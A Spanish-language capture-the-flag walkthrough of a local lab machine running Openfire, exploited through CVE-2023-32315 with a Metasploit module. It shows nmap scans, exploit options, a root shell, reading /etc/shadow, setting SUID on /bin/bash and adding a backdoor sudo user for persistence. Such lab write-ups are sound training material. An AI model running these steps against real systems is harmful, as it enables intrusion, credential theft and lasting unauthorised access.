
![](img/Pasted%20image%2020241208220722.png#center)



Empezaremos realizando un ping a la máquina para verificar su correcto funcionamiento, al hacerlo vemos que tiene un TTL de 64, lo que significa que la máquina objetivo usa un sistema operativo Linux.

![](img/Pasted%20image%2020241206213133.png#center)

Como vemos, la máquina funciona correctamente y podemos empezar con el proceso de enumeración de la misma, vamos a ello.

# Enumeración

Lo primero que haremos para enumerar esta máquina será realizar un escaneo básico de puertos para identificar cuáles están abiertos.
```
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
```
![](img/Pasted%20image%2020241206213305.png#center)


Vemos bastantes puertos abiertos, vamos a realizar un escaneo más exhaustivo para tratar de enumerar los servicios así como para lanzar ciertos scripts básicos de reconocimiento. En principio vamos a centrarnos en los `puertos 22,7070,7777 y 9090` ya que parecen ser los más importantes.

```
nmap -p 22,7070,7777,9090 -sVC --min-rate 5000 -n -Pn 172.17.0.2
```
![](img/Pasted%20image%2020241206213527.png)
![](img/Pasted%20image%2020241206213638.png)


Podemos ver que tanto en el puerto 7070 como en el 9090 tenemos disponibles dos servicios web, vamos a inspeccionar los mismos manualmente.


#### Puerto 7070
![](img/Pasted%20image%2020241206213833.png)


#### Puerto 9090
![](img/Pasted%20image%2020241206213857.png)
En el puerto 9090 se nos muestra un panel de login de Openfire que nos proporciona la versión del mismo, vamos a probar a ingresar con credenciales por defecto y vamos a realizar una investigación sobre esta versión en concreto para ver si hay alguna vulnerabilidad conocida que podamos explotar.


![](img/Pasted%20image%2020241206214307.png)

Encontramos un CVE que se encuentra en esta versión en concreto y haciendo una búsqueda vemos que Metasploit lo tiene incluido en su base de datos por lo que vamos a tratar de explotarlo ya que nos permitiría la ejecución remota de código en caso de funcionar correctamente.
![](img/Pasted%20image%2020241206214554.png)




# Explotación

### Usamos el módulo
```
use 4
# ó
use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
```
![](img/Pasted%20image%2020241206214905.png)


### Mostramos las opciones
```
show options
```
![](img/Pasted%20image%2020241206214955.png)




### Configuramos las opciones
- Tenemos que configurar:
	- RHOSTS: Es la IP de la máquina victima
	- LHOST: La IP de nuestra máquina atacante
	- RPORT: Verificar que está correcto, en este caso, está bien configurado
```
set RHOSTS 172.17.0.2
set LHOST 172.17.0.1           # también se puede configurar set LHOST docker0
```
![](img/Pasted%20image%2020241206215234.png)



### Comprobamos las configuraciones
```
show options
```
![](img/Pasted%20image%2020241206215317.png)



### Ejecutamos el exploit
```
exploit
```
![](img/Pasted%20image%2020241206215508.png)

 Parece que ha funcionado, vamos a interactuar con la sesión que nos acaba de crear. Recibimos una shell como el usuario `root` por lo que no tendremos que realizar ningún paso adicional ya que tenemos el sistema comprometido por completo. Le otorgaremos permisos `SUID` a la `bash`.



### Obtener bash
```
/bin/bash -i
```
![](img/Pasted%20image%2020241206215710.png)



### Contenido `shadow`
```
cat /etc/shadow
```
![](img/Pasted%20image%2020241206220249.png)


#### Permisos SUID a la bash
```
chmod u+s /bin/bash
ls -la /bin/bash
```
![](img/Pasted%20image%2020241206221348.png#center)



<h3><center>Persistencia</center></h3>

Empezaremos creando un usuario nuevo y luego lo añadiremos al grupo sudo. De cualquier forma también le otorgaremos permisos SUID a la bash.


#### Creamos usuario
```
useradd -m -s /bin/bash jonay
```
![](img/Pasted%20image%2020241206220441.png#center)


#### Contraseña al usuario
```
passwd jonay
```
![](img/Pasted%20image%2020241206220558.png#center)


#### Agregar al grupo
```
usermod -aG sudo jonay 
```
![](img/Pasted%20image%2020241206220646.png#center)

#### Comprobamos que se creo
```
cat /etc/shadow
```
![](img/Pasted%20image%2020241206220802.png)
>ℹ
>	*Vemos que el usuario se ha creado correctamente y que puede usar sudo sin restricciones, vamos a ejecutar una shell como root tanto con sudo como con los permisos SUID que le hemos otorgado a la shell para demostrar la persistencia obtenida.*



Una vez hecho esto vamos a tratar de iniciar sesión por SSH con nuestro nuevo usuario creado. Vamos a la terminal de nuestro KALI




<h3><center>Iniciar Sesión SSH</center></h3>
```
ssh jonay@172.17.0.2
```
![](img/Pasted%20image%2020241206221709.png)


### Elevar privilegios
Utilizamos el siguiente comando para comprobar si podemos ejecutar cualquier comando como usuario `root
```
sudo -l
```
![](img/Pasted%20image%2020241206221830.png)


Vemos que podemos ejecutar cualquier comando como usuarios `root`, como antes configuramos la `bash`, para que tenga permisos `SUID`, vamos a ejecutar como usuario `root` la `/bin/bash`
```
sudo /bin/bah
```
![](img/Pasted%20image%2020241206222030.png#center)

Somos el usuario `root`. Tenemos persistencia total en la máquina. Sin más que decir, tenemos el sistema comprometido por completo y hemos conseguido obtener una gran persistencia por lo que podemos dar por concluida la máquina
